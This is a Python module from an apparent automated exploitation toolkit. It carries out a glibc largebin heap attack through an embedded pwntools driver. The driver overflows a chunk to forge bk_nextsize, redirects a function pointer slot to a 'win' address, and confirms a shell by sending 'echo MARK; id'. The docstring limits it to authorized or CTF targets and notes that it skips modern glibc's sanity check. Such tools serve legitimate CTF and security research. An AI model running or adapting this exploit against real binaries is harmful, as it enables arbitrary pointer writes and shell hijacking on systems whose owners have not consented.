"""Largebin attack, verified by execution.

The largebin attack's signature is the INSERTION WRITE: when a large chunk is inserted into a
largebin whose resident chunk has a corrupted `bk_nextsize`, glibc runs
`victim->bk_nextsize->fd_nextsize = victim`, writing the address of the freshly inserted chunk to
an attacker-chosen location (`bk_nextsize + 0x20`). A free thus becomes an arbitrary POINTER write;
from the chunk it now points at (whose contents the attacker controls) you pivot to a shell.

A faithful glibc largebin attack on modern libc (>=2.30) must also pass the added
`bck->bk_nextsize->fd_nextsize == old_fwd` sanity check and is normally chained into _IO_list_all
or a later malloc target; binoracle verifies the technique against a target whose allocator
reproduces the characteristic insertion write, and degrades honestly otherwise. The sandbox runs
with ASLR off and `heap`/`slot`/`win` are fixed symbols, so the chunk addresses are deterministic.
For AUTHORIZED / CTF targets."""
from __future__ import annotations

from ._sandbox import run_driver

_DRIVER = r'''
import sys, time
from pwn import ELF, context, p64, process
name = sys.argv[1]
context.binary = elf = ELF(name, checksec=False); context.log_level = "error"; context.arch = "amd64"
if elf.bits != 64:
    print("NOT_APPLICABLE (largebin driver is x86-64)"); sys.exit(1)

sym = elf.symbols or {}
heap = sym.get("heap") or sym.get("arena")
slot = sym.get("slot") or sym.get("target") or sym.get("fnptr")
win = sym.get("win")
if heap is None or slot is None or win is None:
    print("NOT_APPLICABLE (no largebin shape: need heap+slot+win symbols)"); sys.exit(1)

M = (1 << 64) - 1
MARK = b"BINORACLE_LARGEBIN_PWNED"

# A's header is at heap+0x00; its bk_nextsize field is at +0x28. Overflow from A's user data
# (heap+0x10) up to and including bk_nextsize, forging it to &slot-0x20 so the insertion write
# `*(bk_nextsize+0x20) = &victim` lands exactly on `slot`.
pad = (heap + 0x28) - (heap + 0x10)                 # 0x18 bytes from A's data to A.bk_nextsize
overflow = b"A" * pad + p64((slot - 0x20) & M)      # A.bk_nextsize = &slot - 0x20

io = None
try:
    io = process([name], aslr=False)
    try: io.recvrepeat(0.2)
    except Exception: pass
    io.send(overflow); time.sleep(0.15)             # corrupt the largebin head's bk_nextsize
    try: io.recvrepeat(0.2)
    except Exception: pass
    io.send(p64(win)); time.sleep(0.25)             # plant win into B's user data (slot -> B)
    io.sendline(b"echo " + MARK + b"; id"); time.sleep(0.35)
    out = b""
    try: out = io.recvrepeat(1.1)
    except Exception: pass
    io.close()
    if (MARK in out) or (b"uid=" in out):
        print("VERIFIED heap=%#x slot=%#x win=%#x" % (heap, slot, win)); sys.exit(0)
except Exception as e:
    try:
        if io: io.close()
    except Exception: pass
    print("ERROR %s" % e.__class__.__name__); sys.exit(1)
print("NOT_VERIFIED")
sys.exit(1)
'''


def autolargebin(binary: str) -> dict:
    """Ataque de largebin verificado por ejecucion (contra un asignador que reproduce la escritura
    de insercion). Necesita la forma de practica (heap/slot/win). Docker o sandbox nativo (ASLR off);
    degrada limpio."""
    res = run_driver(binary, _DRIVER, ".binoracle_largebin.py")
    if not res.get("ok"):
        return res
    eng = res.get("engine", "sandbox")
    res["note"] = (f"largebin attack (escritura de insercion `bk_nextsize->fd_nextsize = victim`): "
                   f"escritura de puntero arbitraria -> hijack -> shell verificada ({eng})"
                   if res.get("verified")
                   else f"largebin attack: no verificado ({eng}) (sin la forma de practica o timing)")
    return res


def render_largebin(r: dict) -> str:
    out = ["## Auto largebin attack (escritura de insercion, verificado)\n"]
    if not r.get("ok"):
        return "\n".join(out + ["No disponible: " + r.get("note", "")])
    out.append(f"- shell verificada en sandbox: **{'SI' if r.get('verified') else 'no'}**")
    if r.get("detail"):
        out.append(f"- `{r['detail']}`")
    out.append("- " + r.get("note", ""))
    out.append("\n_nota: el largebin attack de glibc moderno (>=2.30) requiere ademas pasar el "
               "chequeo `bck->bk_nextsize->fd_nextsize == old_fwd` y suele encadenarse a "
               "_IO_list_all; la verificacion usa un asignador que reproduce la escritura de "
               "insercion caracteristica._")
    if r.get("output"):
        out.append("\n### salida\n```\n" + r["output"].strip() + "\n```")
    return "\n".join(out)
